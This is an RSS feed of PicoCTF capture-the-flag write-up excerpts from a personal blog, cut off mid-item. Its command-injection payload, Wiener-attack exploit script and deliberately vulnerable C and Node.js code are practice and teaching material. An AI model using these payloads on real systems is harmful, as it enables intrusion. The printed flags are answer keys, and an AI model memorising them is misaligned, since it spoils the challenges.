<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PicoCTF :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/picoctf/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/picoctf/index.xml" rel="self" type="application/rss+xml"/><item><title>PicoCTF</title><link>https://bernie6401.github.io/toc/picoctf/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/toc/picoctf/index.html</guid><description>PicoCTF Bad Questions Easy Peasy Questions PWN two-sum:one: RPS:two: babygame01:three: x-sixty-what:three: babygame02:five: Unsubscriptions Are Free:two: hijacking:three::+1: VNE:two::+1: Guessing Game 1:two: tic-tac:two: buffer overflow 2:two: flag leak:two: ropfu:three: function overwrite:one: filtered-shellcode:four: fermat-strings:five: seed-sPRiNG:two: SaaS:two: stack cache:one: Guessing Game 2:three::+1: Stonk Market:five::+1: Kit Engine:four::+1: Misc information General Matryoshka doll MacroHard WeakEdge:two: Investigative Reversing 0:two: like1000:two: WhitePages:two: File types:two: SideChannel:three: Image Stego tunn3l v1s10n:four: m00nwalk:three::+1: m00nwalk2:three: c0rrupt:three: advanced-potion-making:two::+1: Flow Wireshark doo dooo do doo... Wireshark twoo twooo two twoo…:three: shark on wire 1 shark on wire 2:-1: WPA-ing Out:two: Eavesdrop:three: Trivial Flag Transfer Protocol scrambled-bytes:four: WebNet0:one: Torrent Analyze:two: Audio Surfing the Waves:four::+1: Disk Operation Oni:three: Disk, disk, sleuth! II Sleuthkit Intro Pitter, Patter, Platters Operation Orchid:one: Unsolved More Cookies:Five: Very very very Hidden:Five: Web SQLiLite Cookies Insp3ct0r Scavenger Hunt Some Assembly Required 1 Some Assembly Required 2:four: Some Assembly Required 3:five:❌ dont-use-client-side:one: It is my Birthday:two: Most Cookies Who are you?:two::+1: Most Cookies:three::+1: caas:one: Super Serial:four::+1: More SQLi:three::+1: Secrets:three: JAuth:two::+1: JaWT Scratchpad:three::+1: Java Code Analysis!?!:four::+1: Java Script Kiddie:four: Reverse Transformation:two: ARMssembly 0:zero: gogo:three: Let’s get dynamic:two: OTP Implementation:three: Rolling My Own:five: Picker III:three: not crypto:two: Easy as GDB:two: Powershelly:four::+1: No way out:two::+1: droids1:two::+1: droids3:two::+1: droids4:three: asm4:four::+1: Forky:three: Wizardlike:four: Crypto Compress and Attack:four::+1: Classic XtraORdinary:two: Easy Peasy New Caesar Sequences:four::heavy_plus_sign: RSA john_pollard:two: Scrambled: RSA:four::+1: Very Smooth:one: Mind your Ps and Qs Mini RSA:one: NSA Backdoor:three::+1: Dachshund Attacks:two: No Padding, No Problem:three: corrupt-key-1:question: SRA:three::+1: It’s Not My Fault 1:five::heavy_plus_sign:❌ DES/AES Double DES:two: AES-ABC:three::+1: SideChannel PowerAnalysis: Part 1 / 2:four: General Skills PW Crack 4:two: mus1c:four::+1: flag_shop:two::+1: Special &amp; Specialer</description></item><item><title>PicoCTF - `tunn3l v1s10n`</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/index.html</guid><description>PicoCTF - tunn3l v1s10n tags: PicoCTF CTF Misc Challenge: tunn3l v1s10n
Background [筆記] BMP點陣圖格式說明
Exploit - Recover file Analyze $ exiftool tunn3l_v1s10n ExifTool Version Number : 11.88 File Name : tunn3l_v1s10n Directory : . File Size : 2.8 MB File Modification Date/Time : 2023:02:17 04:11:33+08:00 File Access Date/Time : 2023:02:17 04:12:37+08:00 File Inode Change Date/Time : 2023:02:17 04:11:35+08:00 File Permissions : rw-r--r-- File Type : BMP File Type Extension : bmp MIME Type : image/bmp BMP Version : Unknown (53434) Image Width : 1134 Image Height : 306 Planes : 1 Bit Depth : 24 Compression : None Image Length : 2893400 Pixels Per Meter X : 5669 Pixels Per Meter Y : 5669 Num Colors : Use BitDepth Num Important Colors : All Red Mask : 0x27171a23 Green Mask : 0x20291b1e Blue Mask : 0x1e212a1d Alpha Mask : 0x311a1d26 Color Space : Unknown (,5%() Rendering Intent : Unknown (826103054) Image Size : 1134x306 Megapixels : 0.347 It seems a bmp file and check the file signature of the 2 bytes is 42 4D :heavy_check_mark: Check file headers According to BMP_file_format and BMP點陣圖格式說明 :heavy_check_mark:size: 8E 26 2C 00 $\to$ 0x2C268E $\to$ 2893454 bytes :heavy_check_mark:reserved1: 00 00 :heavy_check_mark:reserved2: 00 00 :negative_squared_cross_mark:offset: BA D0 00 00 $\to$ 0xD0BA $\to$ 53434 means it’ll read the bitmap data from offset 53434 bytes. But actually, the data of bitmap is just connect with the header. So, we just need to shift 14 bytes for file header + 40 bytes for info header = 54 bytes $\to$ 0x36 We can peek the data first… It said notaflag{sorry}, means we need to recover other parts.</description></item><item><title>PicoCTF - `Wireshark doo dooo do doo...`</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../index.html</guid><description>PicoCTF - Wireshark doo dooo do doo... tags: PicoCTF CTF Misc Challenge: https://play.picoctf.org/practice/challenge/115?category=4&amp;page=1
Exploit - strings + rot13 $ strings shark1.pcapng | grep "{" ... Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs} ... Obviously a encrypted flag $\to$ use rot13 flag: picoCTF{p33kab00_1_s33_u_deadbeef}</description></item><item><title>PicoCTF - advanced-potion-making</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/index.html</guid><description>PicoCTF - advanced-potion-making tags: PicoCTF CTF Misc Challenge: advanced-potion-making
Background PNG文件格式详解 隐写分析(2) PNG图片隐写
Exploit - Recover + StegSolve Modify the file signature and length to the right value. 89 50 42 11 0D 0A 1A 0A 00 12 13 14 49 48 44 52 $\to$ 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</description></item><item><title>PicoCTF - AES-ABC</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/index.html</guid><description>PicoCTF - AES-ABC tags: PicoCTF CTF Crypto Background What is PPM file?
Source code :::spoiler Source Code
#!/usr/bin/env python from Crypto.Cipher import AES from key import KEY import os import math BLOCK_SIZE = 16 UMAX = int(math.pow(256, BLOCK_SIZE)) def to_bytes(n): s = hex(n) s_n = s[2:] if 'L' in s_n: s_n = s_n.replace('L', '') if len(s_n) % 2 != 0: s_n = '0' + s_n decoded = s_n.decode('hex') pad = (len(decoded) % BLOCK_SIZE) if pad != 0: decoded = "\0" * (BLOCK_SIZE - pad) + decoded return decoded def remove_line(s): # returns the header line, and the rest of the file return s[:s.index('\n') + 1], s[s.index('\n')+1:] def parse_header_ppm(f): data = f.read() header = "" for i in range(3): header_i, data = remove_line(data) header += header_i return header, data def pad(pt): padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE return pt + (chr(padding) * padding) def aes_abc_encrypt(pt): cipher = AES.new(KEY, AES.MODE_ECB) ct = cipher.encrypt(pad(pt)) blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)] iv = os.urandom(16) blocks.insert(0, iv) for i in range(len(blocks) - 1): prev_blk = int(blocks[i].encode('hex'), 16) curr_blk = int(blocks[i+1].encode('hex'), 16) n_curr_blk = (prev_blk + curr_blk) % UMAX blocks[i+1] = to_bytes(n_curr_blk) ct_abc = "".join(blocks) return iv, ct_abc, ct if __name__=="__main__": with open('flag.ppm', 'rb') as f: header, data = parse_header_ppm(f) iv, c_img, ct = aes_abc_encrypt(data) with open('body.enc.ppm', 'wb') as fw: fw.write(header) fw.write(c_img) :::</description></item><item><title>PicoCTF - ARMssembly 0</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---armssembly-0/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---armssembly-0/index.html</guid><description>PicoCTF - ARMssembly 0 Source code :::spoiler ARM assembly code
.arch armv8-a .file	"chall.c" .text .align	2 .global	func1 .type	func1, %function func1: sub	sp, sp, #16 str	w0, [sp, 12] str	w1, [sp, 8] ldr	w1, [sp, 12] ldr	w0, [sp, 8] cmp	w1, w0 bls	.L2 ldr	w0, [sp, 12] b	.L3 .L2: ldr	w0, [sp, 8] .L3: add	sp, sp, 16 ret .size	func1, .-func1 .section	.rodata .align	3 .LC0: .string	"Result: %ld\n" .text .align	2 .global	main .type	main, %function main: stp	x29, x30, [sp, -48]! add	x29, sp, 0 str	x19, [sp, 16] str	w0, [x29, 44] str	x1, [x29, 32] ldr	x0, [x29, 32] add	x0, x0, 8 ldr	x0, [x0] bl	atoi mov	w19, w0 ldr	x0, [x29, 32] add	x0, x0, 16 ldr	x0, [x0] bl	atoi mov	w1, w0 mov	w0, w19 bl	func1 mov	w1, w0 adrp	x0, .LC0 add	x0, x0, :lo12:.LC0 bl	printf mov	w0, 0 ldr	x19, [sp, 16] ldp	x29, x30, [sp], 48 ret .size	main, .-main .ident	"GCC: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0" .section	.note.GNU-stack,"",@progbits :::</description></item><item><title>PicoCTF - asm4</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---asm4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---asm4/index.html</guid><description>PicoCTF - asm4 Description What will asm4(“picoCTF_f97bb”) return? Submit the flag as a hexadecimal value (starting with ‘0x’). NOTE: Your submission for this question will NOT be in the normal flag format.
Source code :::spoiler Source Code
asm4: &lt;+0>:	push ebp &lt;+1>:	mov ebp,esp &lt;+3>:	push ebx &lt;+4>:	sub esp,0x10 &lt;+7>:	mov DWORD PTR [ebp-0x10],0x27a &lt;+14>:	mov DWORD PTR [ebp-0xc],0x0 &lt;+21>:	jmp 0x518 &lt;asm4+27> &lt;+23>:	add DWORD PTR [ebp-0xc],0x1 &lt;+27>:	mov edx,DWORD PTR [ebp-0xc] &lt;+30>:	mov eax,DWORD PTR [ebp+0x8] &lt;+33>:	add eax,edx &lt;+35>:	movzx eax,BYTE PTR [eax] &lt;+38>:	test al,al &lt;+40>:	jne 0x514 &lt;asm4+23> &lt;+42>:	mov DWORD PTR [ebp-0x8],0x1 &lt;+49>:	jmp 0x587 &lt;asm4+138> &lt;+51>:	mov edx,DWORD PTR [ebp-0x8] &lt;+54>:	mov eax,DWORD PTR [ebp+0x8] &lt;+57>:	add eax,edx &lt;+59>:	movzx eax,BYTE PTR [eax] &lt;+62>:	movsx edx,al &lt;+65>:	mov eax,DWORD PTR [ebp-0x8] &lt;+68>:	lea ecx,[eax-0x1] &lt;+71>:	mov eax,DWORD PTR [ebp+0x8] &lt;+74>:	add eax,ecx &lt;+76>:	movzx eax,BYTE PTR [eax] &lt;+79>:	movsx eax,al &lt;+82>:	sub edx,eax &lt;+84>:	mov eax,edx &lt;+86>:	mov edx,eax &lt;+88>:	mov eax,DWORD PTR [ebp-0x10] &lt;+91>:	lea ebx,[edx+eax*1] &lt;+94>:	mov eax,DWORD PTR [ebp-0x8] &lt;+97>:	lea edx,[eax+0x1] &lt;+100>:	mov eax,DWORD PTR [ebp+0x8] &lt;+103>:	add eax,edx &lt;+105>:	movzx eax,BYTE PTR [eax] &lt;+108>:	movsx edx,al &lt;+111>:	mov ecx,DWORD PTR [ebp-0x8] &lt;+114>:	mov eax,DWORD PTR [ebp+0x8] &lt;+117>:	add eax,ecx &lt;+119>:	movzx eax,BYTE PTR [eax] &lt;+122>:	movsx eax,al &lt;+125>:	sub edx,eax &lt;+127>:	mov eax,edx &lt;+129>:	add eax,ebx &lt;+131>:	mov DWORD PTR [ebp-0x10],eax &lt;+134>:	add DWORD PTR [ebp-0x8],0x1 &lt;+138>:	mov eax,DWORD PTR [ebp-0xc] &lt;+141>:	sub eax,0x1 &lt;+144>:	cmp DWORD PTR [ebp-0x8],eax &lt;+147>:	jl 0x530 &lt;asm4+51> &lt;+149>:	mov eax,DWORD PTR [ebp-0x10] &lt;+152>:	add esp,0x10 &lt;+155>:	pop ebx &lt;+156>:	pop ebp &lt;+157>:	ret :::</description></item><item><title>PicoCTF - babygame01</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame01/index.html</guid><description>PicoCTF - babygame01 Background Bof
Description &amp; Hint Get the flag and reach the exit. Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you’ll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 50227. Hint 1: Use ‘w’,‘a’,’s’,’d’ to move around. Hint 2: There may be secret commands to make your life easy.</description></item><item><title>PicoCTF - babygame02</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame02/index.html</guid><description>PicoCTF - babygame02 Source :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int position[2]; // [esp+0h] [ebp-AA0h] BYREF char map[2700]; // [esp+Bh] [ebp-A95h] BYREF char input; // [esp+A97h] [ebp-9h] int *p_argc; // [esp+A98h] [ebp-8h] p_argc = &amp;argc; init_player(position); init_map(map, position); print_map(map); signal(2, sigint_handler); do { do { input = getchar(); move_player(position, input, map); print_map(map); } while ( position[0] != 29 ); // y座標 } while ( position[1] != 89 ); // x座標 puts("You win!"); return 0; } ::: :::spoiler IDA Win Function</description></item><item><title>PicoCTF - buffer overflow 2</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/index.html</guid><description>PicoCTF - buffer overflow 2 Background Bof
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #define BUFSIZE 100 #define FLAGSIZE 64 void win(unsigned int arg1, unsigned int arg2) { char buf[FLAGSIZE]; FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,FLAGSIZE,f); if (arg1 != 0xCAFEF00D) return; if (arg2 != 0xF00DF00D) return; printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts("Please enter your string: "); vuln(); return 0; } :::</description></item><item><title>PicoCTF - c0rrupt</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/index.html</guid><description>PicoCTF - c0rrupt tags: PicoCTF CTF Misc Challenge: c0rrupt
Background advanced-potion-making:two::+1:
Exploit - Recover PNG file Analyze Header 89 65 4E 34 0D 0A B0 AA $\to$ 89 50 4E 47 0D 0A 1A 0A
IHDR 43 22 44 52 $\to$ 49 48 44 52 Then use pngcheck to analyze the file. It said the header still have some error.
$ pngcheck mystery mystery CRC error in chunk pHYs (computed 38d82c82, expected 495224f0) ERROR: mystery Revise pHYs You can open an arbitrary png file and observe pHYs part.</description></item><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---caas/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---caas/index.html</guid><description>PicoCTF - caas tags: PicoCTF CTF Web Background Command Injection
Source code const express = require('express'); const app = express(); const { exec } = require('child_process'); app.use(express.static('public')); app.get('/cowsay/:message', (req, res) => { exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => { if (error) return res.status(500).end(); res.type('txt').send(stdout).end(); }); }); app.listen(3000, () => { console.log('listening'); }); Recon 直覺是command injection
Exploit - Easy Command Injection Payload: /cowsay/123;ls;cat falg.txt Flag: picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
Reference CaaS | Web Category | PicoCTF | CTF For beginners</description></item><item><title>PicoCTF - Compress and Attack</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/picoctf---compress-and-attack/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/picoctf---compress-and-attack/index.html</guid><description>PicoCTF - Compress and Attack tags: PicoCTF CTF Crypto Background zlib compression property 詳細說明一下zlib的壓縮特性是當壓縮的內容出現重複字元的時候，壓縮過後的長度會不變 >>> import zlib >>> enc = zlib.compress(bytes("picoCTF{picoCTF{testing_123456}".encode("utf-8"))) >>> len(enc) 33 >>> enc = zlib.compress(bytes("picoCTF{tepicoCTF{testing_123456}".encode("utf-8"))) >>> len(enc) 33 >>> enc = zlib.compress(bytes("picoCTF{tekpicoCTF{testing_123456}".encode("utf-8"))) >>> len(enc) 34 此時重複的部分就是picoCTF{，若是繼續增加重複的部分(例如：picoCTF{te)，壓縮後的長度也不會變，這樣就可以當作一個oracle，也就是利用長度來判斷增加的字元是不是flag重複的一部分
Source code :::spoiler
#!/usr/bin/python3 -u import zlib from random import randint import os from Crypto.Cipher import Salsa20 flag = open("./flag").read() def compress(text): return zlib.compress(bytes(text.encode("utf-8"))) def encrypt(plaintext): secret = os.urandom(32) cipher = Salsa20.new(key=secret) return cipher.nonce + cipher.encrypt(plaintext) def main(): while True: usr_input = input("Enter your text to be encrypted: ") compressed_text = compress(flag + usr_input) encrypted = encrypt(compressed_text) nonce = encrypted[:8] encrypted_text = encrypted[8:] print(nonce) print(encrypted_text) print(len(encrypted_text)) if __name__ == '__main__': main() :::</description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---cookies/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---cookies/index.html</guid><description>PicoCTF - Cookies tags: PicoCTF CTF Web Challenge: http://mercury.picoctf.net:64944/
Background curl 的用法指南
-H參數添加 HTTP 請求的標頭。 $ curl -H 'Accept-Language: en-US' https://google.com
-s參數將不輸出錯誤和進度信息。 $ curl -s https://www.example.com
-L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。 $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet
-I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。 $ curl -I https://www.example.com
Exploit Try to analyze When I input something, it’ll redirect to another page I tried to change cookie to different number and also modify the different value of name parameter however, still got wrong information.</description></item><item><title>PicoCTF - corrupt-key-1</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/index.html</guid><description>PicoCTF - corrupt-key-1 tags: PicoCTF CTF Crypto Source code private.key -----BEGIN RSA PRIVATE KEY----- MIICXAIBAAKBgQC4yxzKmbasQYdsGIRXMqXL/Idd80bukALOYIUItfz2tgpax3Iq LWTvdOFEOjOOcKc+Y6MD86ya3xmFlWmfbp8wwAnSGcfZjE7IQgNhCDQCnHlWfvwI 9mtLw/Vkv7VxVGoGt+SPs1u5zOqaLNRDSfgpJCB436ZNUlknv9VdCZwCTwIDAQAB AoGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQQDnAFaP9Qa9WJKv klkhJeBsvpvUXf6v6TGjM8E0YwI9TwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAkEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJBAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= -----END RSA PRIVATE KEY----- msg.enc 71dc d160 9ac4 a05c d14f 04a9 b43c 2aa3 83d2 a8d6 749b b978 75d5 437a a944 45f2 4073 f605 ef1c 5657 8d0e 7a2d f3be b5c1 7741 8476 0b3d 44fc b97e 6631 b6fe 2487 6258 d445 a7d7 4c7c e3cc 00ec f925 f442 c91d 10c9 cefb 9ca6 9c88 da3c 9d26 6c96 9033 63d5 6a13 7b64 1fc3 8709 2416 f7fb eb4c 4c94 cc8e 157f cc0e d122 159c 27d5 Recon 可見private.key的內文被corrupted了，必須要修復才能夠解密ciphertext，但看來看去也找不到相關的write up，或是修復的方法，從連結這篇write up也看不懂如何修復，雖然他有附上code，但是很多error也無法debug(主要是看不懂)，總而言之我們的目標就是找出$p$為何</description></item><item><title>PicoCTF - Dachshund Attacks</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/index.html</guid><description>PicoCTF - Dachshund Attacks tags: PicoCTF CTF Crypto Background How about if the private key is too small? Refer Extending Wiener’s Attack Exploit - Small Private Key git clone https://github.com/pablocelayes/rsa-wiener-attack Put the exploit file in this repo. Whole Exploit from pwn import * from Crypto.Util.number import long_to_bytes import ContinuedFractions, Arithmetic context.arch = 'amd64' r = remote("mercury.picoctf.net", 37455) def wiener_hack(e, n): # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git ! frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr >= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print("Hacked!") return d return False r.recvline() e = int(str(r.recvline().strip().decode()).split(" ")[-1]) n = int(str(r.recvline().strip().decode()).split(" ")[-1]) c = int(str(r.recvline().strip().decode()).split(" ")[-1]) d = wiener_hack(e, n) print(long_to_bytes(pow(c, d, n))) r.interactive() Reference CTF_RSA解密学习指南(三) - 低解密指数攻击</description></item><item><title>PicoCTF - Disk, disk, sleuth! II</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/index.html</guid><description>PicoCTF - Disk, disk, sleuth! II tags: PicoCTF CTF Misc Challenge: Disk, disk, sleuth! II
Description &amp; Hint All we know is the file with the flag is named down-at-the-bottom.txt… Disk image: dds2-alpine.flag.img.gz Hint 1: The sleuthkit has some great tools for this challenge as well. Hint 2: Sleuthkit docs here are so helpful: TSK Tool Overview Hint 3: This disk can also be booted with qemu!
Background Linux安装、使用Sleuth kit/Autopsy
Exploit - Use Autopsy Tool to analyze In root folder. :::spoiler flag</description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---dont-use-client-side/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---dont-use-client-side/index.html</guid><description>PicoCTF - dont-use-client-side tags: PicoCTF CTF Web Challenge: dont-use-client-side
Exploit - Page source code picoCTF{no_clients_plz_b706c5}</description></item><item><title>PicoCTF - Double DES</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/des-aes/picoctf---double-des/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/des-aes/picoctf---double-des/index.html</guid><description>PicoCTF - Double DES tags: PicoCTF CTF Crypto Background Meet in the middle attack Source code :::spoiler
#!/usr/bin/python3 -u from Crypto.Cipher import DES import binascii import itertools import random import string def pad(msg): block_len = 8 over = len(msg) % block_len pad = block_len - over return (msg + " " * pad).encode() def generate_key(): return pad("".join(random.choice(string.digits) for _ in range(6))) FLAG = open("flag").read().rstrip() KEY1 = generate_key() KEY2 = generate_key() def get_input(): try: res = binascii.unhexlify(input("What data would you like to encrypt? ").rstrip()).decode() except: res = None return res def double_encrypt(m): msg = pad(m) cipher1 = DES.new(KEY1, DES.MODE_ECB) enc_msg = cipher1.encrypt(msg) cipher2 = DES.new(KEY2, DES.MODE_ECB) return binascii.hexlify(cipher2.encrypt(enc_msg)).decode() print("Here is the flag:") print(double_encrypt(FLAG)) while True: inputs = get_input() if inputs: print(double_encrypt(inputs)) else: print("Invalid input.") :::</description></item><item><title>PicoCTF - droids1</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids1/index.html</guid><description>PicoCTF - droids1 Backgroud Android App 逆向入門之一：拆開與重組 apk : 強烈建議新手在打之前可以先看一下這篇，稍微了解一下整體怎麼包apk以及比要檔案有哪些，或是他們儲存的資料類型之類的
Tools apktool 跟著installation guide就可以安裝成功，此工具目的在於拆解apk，我們知道apk就是一個壓縮檔，如果直接用unzip這種指令，也可以打開，只不過一些經過編譯後的byte code就還是byte code，而apktool可以在解壓縮的同時還原這些byte code Android Studio: 此工具目的在於利用emulator把該軟體安裝後跑起來 JADX: 和ApkTool一樣，可以反編譯apk，但有GUI(Recommended) $ wget https://github.com/skylot/jadx/releases/download/v1.1.0/jadx-1.1.0.zip $ unzip jadx-1.1.0.zip -d jadx $ cd jadx $ cd ./bin $ ./jadx-gui Recon 這一題有兩種方法可以反編譯apk，一種是利用ApkTool，另外一個是JADX，兩者差在有無GUI(JADX有)，主要是參考1的WP
Exploit ApkTools $ apktool d one.apk I: Using Apktool 2.8.1 on one.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: C:\Users\Bernie\AppData\Local\apktool\framework\1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... 如果有按照上面的guide把apktool裝起來，就可以直接下指令，參數d代表decode，對於比較熟Android架構的人來說應該綽綽有餘，畢竟要到哪邊找code/strings之類的，通常都會是那幾個地方，例如： Code會放在./smali/com/hellocmu/picoctf/(PS: 只不過code很醜，畢竟是smali) Strings會放在./res/values/strings.xml</description></item><item><title>PicoCTF - droids3</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids3/index.html</guid><description>PicoCTF - droids3 Background Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Source code package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cilantro(String str); public static String nope(String input) { return "don't wanna"; } public static String yep(String input) { return cilantro(input); } public static String getFlag(String input, Context ctx) { String flag = nope(input); return flag; } } Recon 利用前一題學到的工具(JADX)，先decompiler一下原本的程式在幹嘛(source code如上)，會發現getFlag這個method所呼叫的nope只會吐出don't wanna，而真正會print出flag的是yep這個method，所以我們可以修改一下，不過修改之前還是要知道一下流程 Apktool decode apk file$\to$修改必要的地方$\to$Apktool重新打包$\to$簽名$\to$Align$\to$Done，這一個部分在 Android App 逆向入門之二：修改 smali 程式碼 有詳細的說明</description></item><item><title>PicoCTF - droids4</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids4/index.html</link><pubDate>Mon, 01 